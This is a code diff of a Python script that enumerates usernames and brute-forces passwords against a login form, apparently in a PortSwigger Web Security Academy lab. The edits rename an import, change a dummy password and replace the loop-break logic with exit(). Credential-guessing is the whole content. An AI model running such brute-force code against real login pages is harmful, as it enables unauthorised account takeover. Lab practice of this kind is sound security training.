@@ -1,15 +1,14 @@
 import requests
 from bs4 import BeautifulSoup
-from functions import usernames,passwords
+from credentials import usernames,passwords
 
 url = "https://0a0a007c03ea6b238079f89400850062.web-security-academy.net/login"
 
 
-found = False
 for username in usernames:
     data = {
         "username" : username,
-        "password" : "54dss6sfsf" 
+        "password" : "54dss6sfsyygjyvjhf" # random password
     }
     response = requests.post(url=url,data=data)
     soup = BeautifulSoup(response.text,"html.parser")
@@ -26,7 +25,5 @@ for username in usernames:
 
             if target not in response.text:
                 print("password = ",password)
-                found = True
-                break
-    if found == True:
-        break
+                exit()
+    
